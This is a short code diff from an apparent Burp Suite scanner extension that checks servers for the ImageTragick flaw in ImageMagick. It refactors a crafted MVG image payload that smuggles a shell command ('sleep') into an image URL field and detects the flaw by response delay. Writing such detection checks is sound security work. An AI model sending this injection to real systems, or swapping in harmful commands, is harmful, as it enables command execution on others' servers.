@@ -54,10 +54,13 @@ public class BurpExtender implements IBurpExtender, IScannerCheck
 	final static byte IMAGETRAGICK_SLEEP_SEC = 5;
 	private final static long IMAGETRAGICK_SLEEP_NS = IMAGETRAGICK_SLEEP_SEC * 1000000000L;
 	private final static long IMAGETRAGICK_TRESHOLD_NS = 1000000000L;
+	private final static String IMAGETRAGICK_HEAD =
+		"push graphic-context\nviewbox 0 0 640 480\nfill 'url(";
+	private final static String IMAGETRAGICK_TAIL = ")'\npop graphic-context\n";
 	private final static byte[] IMAGETRAGICK_PAYLOAD = (
-			"push graphic-context\nviewbox 0 0 640 480\n" +
-			"fill 'url(https://127.0.0.0/oops.jpg\"|sleep \"" + IMAGETRAGICK_SLEEP_SEC + ")'\n" +
-			"pop graphic-context\n").getBytes();
+			IMAGETRAGICK_HEAD + "https://127.0.0.0/oops.jpg\"|sleep \"" +
+			IMAGETRAGICK_SLEEP_SEC + IMAGETRAGICK_TAIL
+			).getBytes();
 
 	@Override
 	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
